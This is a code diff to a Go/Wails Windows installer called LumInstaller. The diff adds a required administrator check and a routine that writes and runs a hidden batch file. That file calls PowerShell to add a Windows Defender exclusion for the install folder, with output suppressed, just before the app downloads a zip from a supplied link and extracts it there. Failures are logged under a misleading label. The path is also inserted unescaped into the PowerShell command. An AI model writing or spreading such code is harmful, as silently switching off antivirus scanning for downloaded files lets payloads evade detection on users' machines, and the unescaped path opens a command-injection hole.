@@ -11,14 +11,51 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"syscall"
 
 	"github.com/wailsapp/wails/v2/pkg/runtime"
+	"golang.org/x/sys/windows"
 )
 
 type App struct { ctx context.Context }
 
 func NewApp() *App                         { return &App{} }
-func (a *App) startup(ctx context.Context) { a.ctx = ctx }
+func (a *App) startup(ctx context.Context) { 
+	a.ctx = ctx 
+	if !a.IsAdmin() {
+		_, _ = runtime.MessageDialog(ctx, runtime.MessageDialogOptions{
+			Type:          runtime.ErrorDialog,
+			Title:         "Permissions Required",
+			Message:       "LumInstaller requires Administrator privileges to manage folder exclusions and system bindings.\n\nPlease right-click the application and select 'Run as administrator'.",
+		})
+		runtime.Quit(ctx)
+	}
+}
+
+func (a *App) IsAdmin() bool {
+    var sid *windows.SID
+
+    err := windows.AllocateAndInitializeSid(
+        &windows.SECURITY_NT_AUTHORITY,
+        2,
+        windows.SECURITY_BUILTIN_DOMAIN_RID,
+        windows.DOMAIN_ALIAS_RID_ADMINS,
+        0, 0, 0, 0, 0, 0,
+        &sid,
+    )
+    if err != nil {
+        return false
+    }
+    defer windows.FreeSid(sid)
+
+    token := windows.Token(0)
+    member, err := token.IsMember(sid)
+    if err != nil {
+        return false
+    }
+
+    return member
+}
 
 func (a *App) CheckFile(path string) bool {
 	info, err := os.Stat(path)
@@ -52,7 +89,39 @@ func (a *App) SelectDirectory(text string) (string, error) {
 	return selectedDir, nil
 }
 
+func (a *App) AddDefenderExclusion(targetPath string) error {
+	tmpBatPath := filepath.Join(os.TempDir(), "set_exclusion.bat")
+
+	batContent := fmt.Sprintf(`@echo off
+powershell -Command "Add-MpPreference -ExclusionPath '%s'" > nul 2>&1
+exit /b
+`, targetPath)
+
+	err := os.WriteFile(tmpBatPath, []byte(batContent), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to create temporary exclusion script: %w", err)
+	}
+	defer os.Remove(tmpBatPath)
+
+	cmd := exec.Command("cmd", "/c", tmpBatPath)
+	
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	err = cmd.Run()
+	if err != nil {
+		return fmt.Errorf("failed to execute exclusion script (Make sure app is running as Admin): %w", err)
+	}
+
+	return nil
+}
+
 func (a *App) Install(link string, name string, dest string) error {
+	cleanDest := filepath.Clean(dest)
+
+	if err := a.AddDefenderExclusion(cleanDest); err != nil {
+		fmt.Printf("Defender tracking notification notice: %v\n", err)
+	}
+
 	downloadURL := link
 	tmpZipPath := filepath.Join(os.TempDir(), name + ".zip")
 
@@ -80,8 +149,6 @@ func (a *App) Install(link string, name string, dest string) error {
 	archive, err := zip.OpenReader(tmpZipPath)
 	if err != nil { return fmt.Errorf("failed to open zip archive: %w", err) }
 	defer archive.Close()
-
-	cleanDest := filepath.Clean(dest)
 
 	for _, file := range archive.File {
 		filePath := filepath.Join(cleanDest, file.Name)
